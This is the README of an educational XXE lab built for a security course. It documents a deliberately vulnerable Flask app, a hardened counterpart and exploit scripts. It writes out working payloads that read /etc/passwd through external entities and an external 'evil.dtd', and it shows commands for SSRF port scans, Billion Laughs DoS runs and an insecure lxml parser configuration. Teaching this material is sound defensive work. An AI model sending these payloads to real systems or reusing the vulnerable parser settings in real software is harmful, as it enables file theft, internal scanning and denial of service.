# XXE Security Demo Project

**Comprehensive demonstration of XML External Entity (XXE) vulnerabilities, exploitation techniques, and security best practices.**

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/)
[![Flask](https://img.shields.io/badge/Flask-3.0-green)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/License-Educational-orange)](LICENSE)

> **⚠️ EDUCATIONAL PURPOSES ONLY**  
> This project contains intentionally vulnerable code for security education.  
> Do NOT deploy to production or use against systems without permission.

---

## 🔍 Overview

This project demonstrates **XML External Entity (XXE)** vulnerabilities through:

- **Vulnerable Application**: Flask app with intentional XXE vulnerabilities
- **Secure Application**: Properly configured XML parser preventing XXE
- **Exploit Scripts**: Automated Python scripts for testing XXE attacks
- **Comprehensive Documentation**: Real-world examples, security comparisons, remediation guides

**Developed for:** Web and Mobile Application Security Testing Course<br>
**Date:** November 2025

---

## 📁 Project Structure
```
xxe-security-demo/
├── vulnerable_app/          # Intentionally vulnerable Flask application
│   ├── app.py              # Main vulnerable app (port 5000)
│   ├── app_urllib.py       # Same app + urllib resolver for lxml 6.x HTTP DTDs (see below)
│   ├── uploads/            # Uploaded XML files
│   └── sensitive_data.txt  # Demo sensitive file
│
├── secure_app/             # Secure Flask application
│   ├── app.py             # Secure app with XXE protection (port 5001)
│   └── uploads/           # Uploaded XML files
│
├── exploits/               # Automated exploit scripts
│   ├── file_disclosure.py # File disclosure via XXE
│   ├── ssrf_attack.py     # SSRF attack via XXE
│   ├── dos_attack.py      # DoS (Billion Laughs) attack
│   └── README.md          # Exploit documentation
│
├── docs/                   # Documentation
│   ├── security-comparison.md      # Vulnerable vs Secure comparison
│   ├── real-world-examples.md      # Real XXE incidents (Facebook, Google, etc.)
│   └── screenshots/                # Demo screenshots
│
├── requirements.txt        # Python dependencies
└── README.md              # This file
```

---

## ✨ Features

### 🎯 Vulnerable Application Features
- ✅ XXE-vulnerable XML parser (lxml)
- ✅ File disclosure vulnerability
- ✅ Partial SSRF vulnerability
- ✅ Protected against DoS (lxml built-in limits)
- ✅ Web interface with file upload
- ✅ API endpoint for testing

### 🔒 Secure Application Features
- ✅ Properly configured XML parser
- ✅ External entities disabled
- ✅ Network access blocked
- ✅ DTD loading disabled
- ✅ DoS protection enabled
- ✅ Same interface as vulnerable app

### 🛠️ Exploit Tools
- ✅ **File Disclosure**: Automated local file reading
- ✅ **SSRF**: Server-side request forgery attempts
- ✅ **DoS**: Billion Laughs attack testing
- ✅ Command-line interfaces
- ✅ Verbose debugging modes

---

## 🚀 Installation

### Prerequisites

- Python 3.8 or higher
- pip (Python package manager)
- Git

### Step 1: Clone Repository
```bash
git clone https://github.com/Fablek/xxe-security-demo.git
cd xxe-security-demo
```

### Step 2: Create Virtual Environment
```bash
python3 -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate
```

### Step 3: Install Dependencies
```bash
pip install -r requirements.txt
```

**Errata corrigé:** The dependency versions below were wrong in earlier revisions (they listed `lxml` 5.3.0, etc.). They are now aligned with the pinned versions in `requirements.txt`.

**Dependencies (see `requirements.txt` for the full lockfile):**
- Flask 3.1.2
- lxml 6.0.2
- requests 2.32.5

---

## 🎮 Quick Start

### 1. Start Vulnerable Application
```bash
cd vulnerable_app
python app.py
```

**Access at:** http://127.0.0.1:5000

To run the alternative app that fetches **HTTP/HTTPS** DTD URLs via Python (for **lxml 6.x** on typical binary wheels), use `python app_urllib.py` in the same directory (same port; see [app_urllib and lxml 6.x](#app-urllib-lab)).

### 2. Start Secure Application (Optional)
```bash
# In a new terminal
cd secure_app
python app.py
```

**Access at:** http://127.0.0.1:5001

### 3. Run Exploit Scripts
```bash
cd exploits

# File disclosure attack
python file_disclosure.py -t http://127.0.0.1:5000 -f /etc/passwd

# SSRF attack
python ssrf_attack.py -t http://127.0.0.1:5000 --scan localhost --common-ports

# DoS attack (with confirmation)
python dos_attack.py -t http://127.0.0.1:5000
```

---

## 📖 Usage Guide

### Testing File Disclosure (XXE)

#### Manual Testing (Web Interface)

1. Open http://127.0.0.1:5000
2. Paste this payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

3. Click "Parse XML"
4. Observe: Contents of `/etc/passwd` displayed

#### Automated Testing (CLI)
```bash
# Read system files
python exploits/file_disclosure.py -t http://127.0.0.1:5000 -f /etc/passwd
python exploits/file_disclosure.py -t http://127.0.0.1:5000 -f /etc/hosts

# Read application files (use full path)
python exploits/file_disclosure.py -t http://127.0.0.1:5000 -f /path/to/sensitive_data.txt

# Verbose mode
python exploits/file_disclosure.py -t http://127.0.0.1:5000 -f /etc/passwd -v
```

---

### Testing SSRF
```bash
# Access internal endpoint
python exploits/ssrf_attack.py -t http://127.0.0.1:5000 -u http://127.0.0.1:5000/health

# Port scanning
python exploits/ssrf_attack.py -t http://127.0.0.1:5000 --scan localhost --common-ports
python exploits/ssrf_attack.py -t http://127.0.0.1:5000 --scan 127.0.0.1 --ports 5000,8080,3000

# Verbose mode
python exploits/ssrf_attack.py -t http://127.0.0.1:5000 -u http://127.0.0.1:5000/health -v
```

**Note:** On many current **lxml 6.x** binary wheels, libxml2 no longer offers direct HTTP/FTP for URL parsing, so “pure libxml” HTTP entity resolution behaves differently than older builds. For a lab that still exercises **HTTP-fetched DTDs** in-process, use [`vulnerable_app/app_urllib.py`](vulnerable_app/app_urllib.py) and the [dedicated section](#app-urllib-lab). Unrelated file-based XXE demos work with `app.py` as before.

---

<a id="app-urllib-lab"></a>
## `app_urllib.py` and lxml 6.x (HTTP via Python)

Starting with [lxml 6.0.0](https://github.com/lxml/lxml/releases) (e.g. binary wheels using **libxml2 2.14.4** and **libxslt 1.1.43**), release notes state:

- *"Binary wheels use the library versions libxml2 2.14.4 and libxslt 1.1.43. **Note that this disables direct HTTP and FTP support for parsing from URLs.** **Use Python URL request tools instead (which usually also support HTTPS).** To test the availability, use ``"http" in etree.LIBXML_FEATURES``."*

`vulnerable_app/app_urllib.py` is the same vulnerable Flask demo as `app.py`, but registers a custom **`lxml` `HttpUrlResolver`** that loads `http://` and `https://` resources with **`urllib`**, with a default **localhost-only** allowlist (`ALLOWED_RESOLVER_HOSTS`). That matches the upstream recommendation: when `"http" not in etree.LIBXML_FEATURES`, you can still perform resolver-driven fetches in Python for educational SSRF/DTD demos.

**Important:** With the usual **lxml from Python** workflow here, you are still looking at **inline / in-band** effects (entity text ends up in the parsed tree and the app’s response). This lab is **not** set up to demonstrate **out-of-band (OOB)** exfiltration to a remote colluding server; OOB is a different scenario (firewalls, blind channels, etc.).

**Run the app**

```bash
cd vulnerable_app
python app_urllib.py
# optional: check whether libxml exposes HTTP
python -c "from lxml import etree; print('http' in etree.LIBXML_FEATURES)"
```

**Serve the external DTD** (example on port 9000). Create a file `evil.dtd` in the directory you will serve:

```dtd
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

```bash
cd /path/where/evil/dtd/lives
python -m http.server 9000
```

**In-band parameter-entity + external DTD payload** (paste into the app, or POST to `/api/parse`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://localhost:9000/evil.dtd">
  %remote;
]>
<data>&xxe;</data>
```

The expanded `&xxe;` value appears in the parsed output when entities are resolved. Adjust host or port to match your HTTP server; keep the resolver allowlist in `app_urllib.py` consistent with the URL you use (default: `127.0.0.1`, `localhost`, `::1`).

---

### Testing DoS (Billion Laughs)
```bash
# Simple DoS
python exploits/dos_attack.py -t http://127.0.0.1:5000

# Billion Laughs with custom depth
python exploits/dos_attack.py -t http://127.0.0.1:5000 --type billion_laughs --depth 5

# Quadratic blowup
python exploits/dos_attack.py -t http://127.0.0.1:5000 --type quadratic

# Verbose mode
python exploits/dos_attack.py -t http://127.0.0.1:5000 -v
```

**Note:** lxml has entity expansion limits, so DoS attacks are blocked. This is a good security feature!

---

## 🔐 Security Comparison

### Key Differences

| Feature | Vulnerable App | Secure App |
|---------|---------------|------------|
| **External Entities** | Enabled ❌ | Disabled ✅ |
| **Network Access** | Allowed ❌ | Blocked ✅ |
| **DTD Loading** | Enabled ❌ | Disabled ✅ |
| **Tree Size Limits** | None ❌ | Enforced ✅ |
| **Port** | 5000 | 5001 |
| **UI Theme** | Red (Warning) | Green (Safe) |

### Configuration Comparison

**Vulnerable:**
```python
parser = etree.XMLParser(
    resolve_entities=True,   # ❌ XXE vulnerability
    no_network=False,        # ❌ SSRF possible
    load_dtd=True           # ❌ Entity expansion
)
```

**Secure:**
```python
parser = etree.XMLParser(
    resolve_entities=False,  # ✅ XXE prevented
    no_network=True,         # ✅ SSRF blocked
    load_dtd=False          # ✅ No expansion
)
```

**Full comparison:** See [docs/security-comparison.md](docs/security-comparison.md)

---

## 🌍 Real-World Examples

This project is inspired by actual XXE vulnerabilities found in production systems:

### Notable Incidents

1. **Facebook (2013)** - $33,500 Bug Bounty
   - XXE in OpenID authentication
   - Led to remote code execution
   - Researcher: Reginaldo Silva

2. **Google (2012)**
   - XXE in AppEngine and Blogger
   - Read-only access to production servers
   - Same researcher as Facebook incident

3. **Android Development Tools (2017)**
   - XXE in APKTool, Android Studio, Eclipse
   - Discovered by Check Point Research
   - Affected millions of developers

4. **Microsoft SharePoint (CVE-2019-0604)**
   - Critical RCE via XXE
   - Exploited by APT groups
   - Active exploitation for 9+ months

**Full details:** See [docs/real-world-examples.md](docs/real-world-examples.md)

---

## 📚 Documentation

### Available Documents

- **[Security Comparison](docs/security-comparison.md)** - Vulnerable vs Secure code analysis
- **[Real-World Examples](docs/real-world-examples.md)** - CVEs and incident reports
- **[Exploit Documentation](exploits/README.md)** - How to use exploit scripts

### Educational Resources

- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [CWE-611](https://cwe.mitre.org/data/definitions/611.html)

---

## 🧪 Testing Results

### Vulnerable Application

| Attack Type | Status | Result |
|------------|--------|--------|
| File Disclosure | ✅ SUCCESS | Read `/etc/passwd` (9,344 bytes) |
| File Disclosure | ✅ SUCCESS | Read `sensitive_data.txt` (456 bytes) |
| SSRF (HTTP) | ⚠️ BLOCKED | lxml security feature |
| SSRF (File) | ✅ SUCCESS | Read `/etc/hosts` |
| DoS (Billion Laughs) | ⚠️ BLOCKED | lxml has limits |

### Secure Application

| Attack Type | Status | Result |
|------------|--------|--------|
| File Disclosure | ✅ BLOCKED | External entities disabled |
| SSRF | ✅ BLOCKED | Network access disabled |
| DoS | ✅ BLOCKED | Entity expansion disabled |

## 🙏 Acknowledgments

- **OWASP** - For comprehensive security documentation
- **PortSwigger** - For excellent XXE tutorials
- **Check Point Research** - For ParseDroid vulnerability research
- Course instructors and peers for feedback

---

**🎓 Remember: This is for learning. Use responsibly and ethically!**

---

**Last Updated:** November 2025  
**Version:** 1.0.0  
**Status:** Educational Demo - Complete